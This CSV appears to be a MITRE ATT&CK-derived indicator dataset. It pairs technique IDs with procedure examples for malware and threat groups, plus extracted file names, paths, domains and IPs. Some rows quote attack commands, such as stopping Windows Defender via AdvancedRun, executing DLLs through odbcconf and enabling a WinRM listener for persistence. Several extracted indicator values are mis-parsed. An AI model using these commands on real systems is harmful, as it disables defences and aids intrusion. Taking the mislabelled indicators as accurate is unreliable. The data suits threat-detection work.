T1569.002,Service Execution,WhisperGate  can download and execute AdvancedRun.exe via  sc.exe .   [59]      [60],Procedure Examples,file,sc.exe
T1569.002,Service Execution,"Wingbird  uses services.exe to register a new autostart service named ""Audit Service"" using a copy of the local lsass.exe file.   [62]      [63]",Procedure Examples,file,services.exe
T1569.002,Service Execution,"Wingbird  uses services.exe to register a new autostart service named ""Audit Service"" using a copy of the local lsass.exe file.   [62]      [63]",Procedure Examples,file,lsass.exe
T1569.002,Service Execution,Winnti for Windows  can run as a service using svchost.exe.   [64],Procedure Examples,file,svchost.exe
T1569.002,Service Execution,Wizard Spider  has used services.exe to execute scripts and executables during lateral movement within a victim network.   [65]      [66],Procedure Examples,file,services.exe
T1556.007,Hybrid Identity,"APT29 has edited the  Microsoft.IdentityServer.Servicehost.exe.config  file to load a malicious DLL into the AD FS process, thereby enabling persistent access to any service federated with AD FS for a user with a specified User Principal Name.   [4]",Procedure Examples,file,Microsoft.IdentityServer.Servicehost.exe
T1560.001,Archive via Utility,"During  FunnyDream , the threat actors used 7zr.exe to add collected files to an archive.   [20]",Procedure Examples,file,7zr.exe
T1560.001,Archive via Utility,"MuddyWater  has used the native Windows cabinet creation tool, makecab.exe, likely to compress stolen data to be uploaded.   [48]",Procedure Examples,file,makecab.exe
T1016,System Network Configuration Discovery,Agent Tesla  can collect the IP address of the victim machine and spawn instances of netsh.exe to enumerate wireless settings.   [8]      [9],Procedure Examples,file,netsh.exe
T1016,System Network Configuration Discovery,Milan  can run  C:\Windows\system32\cmd.exe /c cmd /c ipconfig /all 2&gt;&amp;1  to discover network settings.   [137],Procedure Examples,path,C:\Windows\system32\cmd.exe
T1016,System Network Configuration Discovery,Milan  can run  C:\Windows\system32\cmd.exe /c cmd /c ipconfig /all 2&gt;&amp;1  to discover network settings.   [137],Procedure Examples,file,cmd.exe
T1016,System Network Configuration Discovery,Mis-Type  may create a file containing the results of the command  cmd.exe /c ipconfig /all .   [138],Procedure Examples,file,cmd.exe
T1016,System Network Configuration Discovery,PcShare  can obtain the proxy settings of a compromised machine using  InternetQueryOptionA  and its IP address by running  nslookup myip.opendns.comresolver1.opendns.com\r\n .   [88],Procedure Examples,domain,myip.opendns.comresolver1.opendns.com
T1016,System Network Configuration Discovery,"QuasarRAT  has the ability to enumerate the Wide Area Network (WAN) IP through requests to ip-api[.]com, freegeoip[.]net, or api[.]ipify[.]org observed with user-agent string  Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0 .   [185]",Procedure Examples,domain,freegeoip.net
T1016,System Network Configuration Discovery,"QuasarRAT  has the ability to enumerate the Wide Area Network (WAN) IP through requests to ip-api[.]com, freegeoip[.]net, or api[.]ipify[.]org observed with user-agent string  Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0 .   [185]",Procedure Examples,domain,ip-api.com
T1016,System Network Configuration Discovery,"QuasarRAT  has the ability to enumerate the Wide Area Network (WAN) IP through requests to ip-api[.]com, freegeoip[.]net, or api[.]ipify[.]org observed with user-agent string  Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0 .   [185]",Procedure Examples,domain,api.ipify.org
T1016,System Network Configuration Discovery,"QuasarRAT  has the ability to enumerate the Wide Area Network (WAN) IP through requests to ip-api[.]com, freegeoip[.]net, or api[.]ipify[.]org observed with user-agent string  Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0 .   [185]",Procedure Examples,user-agent,Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0
T1016,System Network Configuration Discovery,"SoreFang  can collect the TCP/IP, DNS, DHCP, and network adapter configuration on a compromised host via  ipconfig.exe /all .   [208]",Procedure Examples,file,ipconfig.exe
T1055.004,Asynchronous Procedure Call,Carberp  has queued an APC routine to explorer.exe by calling ZwQueueApcThread.   [7],Procedure Examples,file,explorer.exe
T1055.004,Asynchronous Procedure Call,FIN8  has injected malicious code into a new svchost.exe process.   [8],Procedure Examples,file,svchost.exe
T1055.004,Asynchronous Procedure Call,Pillowmint  has used the NtQueueApcThread syscall to inject code into svchost.exe.   [11],Procedure Examples,file,svchost.exe
T1055.004,Asynchronous Procedure Call,Saint Bot  has written its payload into a newly-created  EhStorAuthn.exe  process using  ZwWriteVirtualMemory  and executed it using  NtQueueApcThread  and  ZwAlertResumeThread .   [12],Procedure Examples,file,EhStorAuthn.exe
T1106,Native API,Cobalt Strike 's Beacon payload is capable of running shell commands without  cmd.exe  and PowerShell commands without  powershell.exe    [49]      [50]      [51],Procedure Examples,file,cmd.exe
T1106,Native API,Cobalt Strike 's Beacon payload is capable of running shell commands without  cmd.exe  and PowerShell commands without  powershell.exe    [49]      [50]      [51],Procedure Examples,file,powershell.exe
T1134.004,Parent PID Spoofing,"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the  CreateProcess  API call, which supports a parameter that defines the PPID to use.   [1]    This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via  svchost.exe  or  consent.exe ) rather than the current user context.   [2]      Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of  PowerShell / Rundll32  to be  explorer.exe  rather than an Office document delivered as part of  Spearphishing Attachment .   [3]    This spoofing could be executed via  Visual Basic  within a malicious Office document or any code that can perform  Native API .   [4]      [3]      Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as  lsass.exe ), causing the new process to be elevated via the inherited access token.   [5]",Description,path,/ Rundll32  to be  explorer.exe
T1134.004,Parent PID Spoofing,"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the  CreateProcess  API call, which supports a parameter that defines the PPID to use.   [1]    This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via  svchost.exe  or  consent.exe ) rather than the current user context.   [2]      Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of  PowerShell / Rundll32  to be  explorer.exe  rather than an Office document delivered as part of  Spearphishing Attachment .   [3]    This spoofing could be executed via  Visual Basic  within a malicious Office document or any code that can perform  Native API .   [4]      [3]      Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as  lsass.exe ), causing the new process to be elevated via the inherited access token.   [5]",Description,file,svchost.exe
T1134.004,Parent PID Spoofing,"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the  CreateProcess  API call, which supports a parameter that defines the PPID to use.   [1]    This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via  svchost.exe  or  consent.exe ) rather than the current user context.   [2]      Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of  PowerShell / Rundll32  to be  explorer.exe  rather than an Office document delivered as part of  Spearphishing Attachment .   [3]    This spoofing could be executed via  Visual Basic  within a malicious Office document or any code that can perform  Native API .   [4]      [3]      Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as  lsass.exe ), causing the new process to be elevated via the inherited access token.   [5]",Description,file,consent.exe
T1134.004,Parent PID Spoofing,"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the  CreateProcess  API call, which supports a parameter that defines the PPID to use.   [1]    This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via  svchost.exe  or  consent.exe ) rather than the current user context.   [2]      Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of  PowerShell / Rundll32  to be  explorer.exe  rather than an Office document delivered as part of  Spearphishing Attachment .   [3]    This spoofing could be executed via  Visual Basic  within a malicious Office document or any code that can perform  Native API .   [4]      [3]      Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as  lsass.exe ), causing the new process to be elevated via the inherited access token.   [5]",Description,file,explorer.exe
T1134.004,Parent PID Spoofing,"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the  CreateProcess  API call, which supports a parameter that defines the PPID to use.   [1]    This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via  svchost.exe  or  consent.exe ) rather than the current user context.   [2]      Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of  PowerShell / Rundll32  to be  explorer.exe  rather than an Office document delivered as part of  Spearphishing Attachment .   [3]    This spoofing could be executed via  Visual Basic  within a malicious Office document or any code that can perform  Native API .   [4]      [3]      Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as  lsass.exe ), causing the new process to be elevated via the inherited access token.   [5]",Description,file,lsass.exe
T1134.004,Parent PID Spoofing,KONNI  has used parent PID spoofing to spawn a new  cmd  process using  CreateProcessW  and a handle to  Taskmgr.exe .   [8],Procedure Examples,file,Taskmgr.exe
T1127.001,MSBuild,"Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.   [1]      Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.   [1]      [2]    MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.   [3]",Description,file,MSBuild.exe
T1127.001,MSBuild,Empire  can use built-in modules to abuse trusted utilities like MSBuild.exe.   [4],Procedure Examples,file,MSBuild.exe
T1127.001,MSBuild,"A version of  PlugX  loads as shellcode within a .NET Framework project using msbuild.exe, presumably to bypass application control techniques.   [6]",Procedure Examples,file,msbuild.exe
T1574.012,COR_PROFILER,Blue Mockingbird  has used wmic.exe and Windows Registry modifications to set the COR_PROFILER environment variable to execute a malicious DLL whenever a process loads the .NET CLR.   [3],Procedure Examples,file,wmic.exe
T1069.002,Domain Groups,SoreFang  can enumerate domain groups by executing  net.exe group /domain .   [27],Procedure Examples,file,net.exe
T1574,Hijack Execution Flow,"Denis  replaces the nonexistent Windows DLL ""msfte.dll"" with its own malicious version, which is loaded by the SearchIndexer.exe and SearchProtocolHost.exe.   [1]",Procedure Examples,file,msfte.dll
T1574,Hijack Execution Flow,"Denis  replaces the nonexistent Windows DLL ""msfte.dll"" with its own malicious version, which is loaded by the SearchIndexer.exe and SearchProtocolHost.exe.   [1]",Procedure Examples,file,SearchIndexer.exe
T1574,Hijack Execution Flow,"Denis  replaces the nonexistent Windows DLL ""msfte.dll"" with its own malicious version, which is loaded by the SearchIndexer.exe and SearchProtocolHost.exe.   [1]",Procedure Examples,file,SearchProtocolHost.exe
T1574,Hijack Execution Flow,ShimRat  can hijack the cryptbase.dll within migwiz.exe to escalate privileges and bypass UAC controls.   [3],Procedure Examples,file,cryptbase.dll
T1574,Hijack Execution Flow,ShimRat  can hijack the cryptbase.dll within migwiz.exe to escalate privileges and bypass UAC controls.   [3],Procedure Examples,file,migwiz.exe
T1211,Exploitation for Defense Evasion,APT28  has used CVE-2015-4902 to bypass security features.   [1]      [2],Procedure Examples,cve,CVE-2015-4902
T1070,Indicator Removal,BlackEnergy  has removed the watermark associated with enabling the  TESTSIGNING  boot configuration option by removing the relevant strings in the  user32.dll.mui  of the system.   [3],Procedure Examples,file,user32.dll
T1070,Indicator Removal,Neoichor  can clear the browser history on a compromised host by changing the  ClearBrowsingHistoryOnExit  value to 1 in the  HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Privacy  Registry key.   [15],Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Privacy
T1543.001,Launch Agent,CoinTicker  creates user launch agents named .espl.plist and com.apple.[random string].plist to establish persistence.   [11],Procedure Examples,domain,com.apple
T1543.001,Launch Agent,Dok  installs two LaunchAgents to redirect all network traffic with a randomly generated name for each plist file maintaining the format  com.random.name.plist .   [16]      [17],Procedure Examples,domain,com.random.name
T1543.001,Launch Agent,The  Komplex  trojan creates a persistent launch agent called with  $HOME/Library/LaunchAgents/com.apple.updates.plist  with  launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist .   [5],Procedure Examples,path,~/Library/LaunchAgents/com.apple
T1543.001,Launch Agent,"MacMa  installs a  com.apple.softwareupdate.plist  file in the  /LaunchAgents  folder with the  RunAtLoad  value set to  true . Upon user login,  MacMa  is executed from  /var/root/.local/softwareupdate  with root privileges. Some variations also include the  LimitLoadToSessionType  key with the value  Aqua , ensuring the  MacMa  only runs when there is a logged in GUI user.   [21]      [22]",Procedure Examples,path,/var/root/.local
T1518.001,Security Software Discovery,Action RAT  can identify AV products on an infected host using the following command:  cmd.exe WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List .   [4],Procedure Examples,file,cmd.exe
T1518.001,Security Software Discovery,Astaroth  checks for the presence of Avast antivirus in the  C:\Program\Files\  folder.    [9],Procedure Examples,path,C:\Program\Files
T1036.004,Masquerade Task or Service,"APT32  has used hidden or non-printing characters to help masquerade service names, such as appending a Unicode no-break space character to a legitimate service name.  APT32  has also impersonated the legitimate Flash installer file name ""install_flashplayer.exe"".   [7]",Procedure Examples,file,install_flashplayer.exe
T1036.004,Masquerade Task or Service,DCSrv  has masqueraded its service as a legitimate svchost.exe process.   [19],Procedure Examples,file,svchost.exe
T1036.004,Masquerade Task or Service,Egregor  has masqueraded the svchost.exe process to exfiltrate data.   [20],Procedure Examples,file,svchost.exe
T1036.004,Masquerade Task or Service,Heyoka Backdoor  has been named  srvdll.dll  to appear as a legitimate service.   [30],Procedure Examples,file,srvdll.dll
T1036.004,Masquerade Task or Service,Higaisa  named a shellcode loader binary  svchast.exe  to spoof the legitimate  svchost.exe .   [31]      [32],Procedure Examples,file,svchast.exe
T1036.004,Masquerade Task or Service,Higaisa  named a shellcode loader binary  svchast.exe  to spoof the legitimate  svchost.exe .   [31]      [32],Procedure Examples,file,svchost.exe
T1218.008,Odbcconf,"Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.   [1]    The Odbcconf.exe binary may be digitally signed by Microsoft.   Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to  Regsvr32 , odbcconf.exe has a  REGSVR  flag that can be misused to execute DLLs (ex:  odbcconf.exe /S /A &amp;lbrace;REGSVR ""C:\Users\Public\file.dll""&amp;rbrace; ).    [2]      [3]      [4]",Description,path,"/S /A &amp;lbrace;REGSVR ""C:\Users\Public\file.dll"
T1218.008,Odbcconf,"Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.   [1]    The Odbcconf.exe binary may be digitally signed by Microsoft.   Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to  Regsvr32 , odbcconf.exe has a  REGSVR  flag that can be misused to execute DLLs (ex:  odbcconf.exe /S /A &amp;lbrace;REGSVR ""C:\Users\Public\file.dll""&amp;rbrace; ).    [2]      [3]      [4]",Description,file,odbcconf.exe
T1218.008,Odbcconf,"Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.   [1]    The Odbcconf.exe binary may be digitally signed by Microsoft.   Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to  Regsvr32 , odbcconf.exe has a  REGSVR  flag that can be misused to execute DLLs (ex:  odbcconf.exe /S /A &amp;lbrace;REGSVR ""C:\Users\Public\file.dll""&amp;rbrace; ).    [2]      [3]      [4]",Description,file,Odbcconf.exe
T1218.008,Odbcconf,"Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.   [1]    The Odbcconf.exe binary may be digitally signed by Microsoft.   Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to  Regsvr32 , odbcconf.exe has a  REGSVR  flag that can be misused to execute DLLs (ex:  odbcconf.exe /S /A &amp;lbrace;REGSVR ""C:\Users\Public\file.dll""&amp;rbrace; ).    [2]      [3]      [4]",Description,file,file.dll
T1218.008,Odbcconf,"Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.   [1]    The Odbcconf.exe binary may be digitally signed by Microsoft.   Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to  Regsvr32 , odbcconf.exe has a  REGSVR  flag that can be misused to execute DLLs (ex:  odbcconf.exe /S /A &amp;lbrace;REGSVR ""C:\Users\Public\file.dll""&amp;rbrace; ).    [2]      [3]      [4]",Description,path,C:\Users\Public\file.dll
T1218.008,Odbcconf,Bumblebee  can use  odbcconf.exe  to run DLLs on targeted hosts.   [5],Procedure Examples,file,odbcconf.exe
T1552.005,Cloud Instance Metadata API,"Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.   Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.   [1]    A cloud metadata API has been used in at least one high profile compromise.   [2]      If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.   [3]      The de facto standard across cloud service providers is to host the Instance Metadata API at  http[:]//169.254.169.254 .",Description,url,http://169.254.169.254
T1552.005,Cloud Instance Metadata API,"Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.   Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.   [1]    A cloud metadata API has been used in at least one high profile compromise.   [2]      If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.   [3]      The de facto standard across cloud service providers is to host the Instance Metadata API at  http[:]//169.254.169.254 .",Description,ip-address,169.254.169.254
T1133,External Remote Services,"During  Operation CuckooBees , the threat actors enabled WinRM over HTTP/HTTPS as a backup persistence mechanism using the following command:  cscript //nologo ""C:\Windows\System32\winrm.vbs"" set winrm/config/service@{EnableCompatibilityHttpsListener=""true""} .   [32]",Procedure Examples,path,C:\Windows\System32\winrm.vbs
T1222.001,Windows File and Directory Permissions Modification,JPIN  can use the command-line utility cacls.exe to change file permissions.   [8],Procedure Examples,file,cacls.exe
T1222.001,Windows File and Directory Permissions Modification,WastedLocker  has a command to take ownership of a file and reset the ACL permissions using the  takeown.exe /F filepath  command.   [11],Procedure Examples,file,takeown.exe
T1134.002,Create Process with Token,KONNI  has duplicated the token of a high integrity process to spawn an instance of cmd.exe under an impersonated user.   [6]      [7],Procedure Examples,file,cmd.exe
T1134.002,Create Process with Token,"The  WhisperGate  third stage can use the AdvancedRun.exe tool to execute commands in the context of the Windows TrustedInstaller group via  %TEMP%\AdvancedRun.exe"" /EXEFilename ""C:\Windows\System32\sc.exe"" /WindowState 0 /CommandLine ""stop WinDefend"" /StartDirectory """" /RunAs 8 /Run .   [14]",Procedure Examples,path,"/EXEFilename ""C:\Windows\System32\sc.exe"
T1134.002,Create Process with Token,"The  WhisperGate  third stage can use the AdvancedRun.exe tool to execute commands in the context of the Windows TrustedInstaller group via  %TEMP%\AdvancedRun.exe"" /EXEFilename ""C:\Windows\System32\sc.exe"" /WindowState 0 /CommandLine ""stop WinDefend"" /StartDirectory """" /RunAs 8 /Run .   [14]",Procedure Examples,file,AdvancedRun.exe
T1134.002,Create Process with Token,"The  WhisperGate  third stage can use the AdvancedRun.exe tool to execute commands in the context of the Windows TrustedInstaller group via  %TEMP%\AdvancedRun.exe"" /EXEFilename ""C:\Windows\System32\sc.exe"" /WindowState 0 /CommandLine ""stop WinDefend"" /StartDirectory """" /RunAs 8 /Run .   [14]",Procedure Examples,file,sc.exe
T1134.002,Create Process with Token,"The  WhisperGate  third stage can use the AdvancedRun.exe tool to execute commands in the context of the Windows TrustedInstaller group via  %TEMP%\AdvancedRun.exe"" /EXEFilename ""C:\Windows\System32\sc.exe"" /WindowState 0 /CommandLine ""stop WinDefend"" /StartDirectory """" /RunAs 8 /Run .   [14]",Procedure Examples,path,C:\Windows\System32\sc.exe
T1036.007,Double File Extension,"Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex:  File.txt.exe  may render in some views as just  File.txt ). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system’s policies.   [1]      [2]       Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain  Initial Access  into a user’s system via  Spearphishing Attachment  then  User Execution . For example, an executable file attachment named  Evil.txt.exe  may display as  Evil.txt  to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.   [2]      Common file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.",Description,file,File.txt.exe
T1036.007,Double File Extension,"Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex:  File.txt.exe  may render in some views as just  File.txt ). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system’s policies.   [1]      [2]       Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain  Initial Access  into a user’s system via  Spearphishing Attachment  then  User Execution . For example, an executable file attachment named  Evil.txt.exe  may display as  Evil.txt  to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.   [2]      Common file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.",Description,file,explorer.exe
T1036.007,Double File Extension,"Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex:  File.txt.exe  may render in some views as just  File.txt ). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system’s policies.   [1]      [2]       Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain  Initial Access  into a user’s system via  Spearphishing Attachment  then  User Execution . For example, an executable file attachment named  Evil.txt.exe  may display as  Evil.txt  to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.   [2]      Common file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.",Description,file,Evil.txt.exe
T1036.007,Double File Extension,The  Bazar  loader has used dual-extension executable files such as PreviewReport.DOC.exe.   [3],Procedure Examples,file,PreviewReport.DOC.exe
T1036.007,Double File Extension,Milan  has used an executable named  companycatalog.exe.config  to appear benign.   [4],Procedure Examples,file,companycatalog.exe
T1119,Automated Collection,VERMIN  saves each collected file with the automatically generated format {0:dd-MM-yyyy}.txt .   [50],Procedure Examples,path,0:dd-MM-yyyy}.txt
T1552.006,Group Policy Preferences,"Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.   [1]      These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).   [2]      The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:   On the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files:  dir /s * .xml",Description,path,/s * .xml
T1562.001,Disable or Modify Tools,FIN6  has deployed a utility script named  kill.bat  to disable anti-virus.   [34],Procedure Examples,file,kill.bat
T1562.001,Disable or Modify Tools,Malware used by  Putter Panda  attempts to terminate processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe).   [70],Procedure Examples,file,SAVAdminService.exe
T1562.001,Disable or Modify Tools,Malware used by  Putter Panda  attempts to terminate processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe).   [70],Procedure Examples,file,SavService.exe
T1562.001,Disable or Modify Tools,SILENTTRINITY 's  amsiPatch.py  module can disable Antimalware Scan Interface (AMSI) functions.   [79],Procedure Examples,domain,amsipatch.py
T1562.001,Disable or Modify Tools,"Turla  has used a AMSI bypass, which patches the in-memory amsi.dll, in PowerShell scripts to bypass Windows antimalware products.   [89]",Procedure Examples,file,amsi.dll
T1562.001,Disable or Modify Tools,WhisperGate  can download and execute AdvancedRun.exe to disable the Windows Defender Theat Protection service and set an exclusion path for the C:\ drive.   [92]      [93]      [94],Procedure Examples,file,AdvancedRun.exe
T1546.011,Application Shimming,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10.    [1]      Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS.    A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:   Custom databases are stored in:   To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to  Bypass User Account Control  (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).   Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.    [2]    Shims can also be abused to establish persistence by continuously being invoked by affected programs.",Description,file,sdbinst.exe
T1546.011,Application Shimming,"SDBbot  has the ability to use application shimming for persistence if it detects it is running as admin on Windows XP or 7, by creating a shim database to patch services.exe.   [5]",Procedure Examples,file,services.exe
T1561.001,Disk Content Wipe,MegaCortex  can wipe deleted data from all drives using  cipher.exe .   [6],Procedure Examples,file,cipher.exe
T1104,Multi-Stage Channels,"An  APT3  downloader first establishes a SOCKS5 connection to 192.157.198[.]103 using TCP port 1913; once the server response is verified, it then requests a connection to 192.184.60[.]229 on TCP port 81.   [1]",Procedure Examples,ip-address,192.184.60.229
T1104,Multi-Stage Channels,"An  APT3  downloader first establishes a SOCKS5 connection to 192.157.198[.]103 using TCP port 1913; once the server response is verified, it then requests a connection to 192.184.60[.]229 on TCP port 81.   [1]",Procedure Examples,ip-address,192.157.198.103
T1104,Multi-Stage Channels,APT41  used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor.   [2],Procedure Examples,file,storescyncsvc.dll
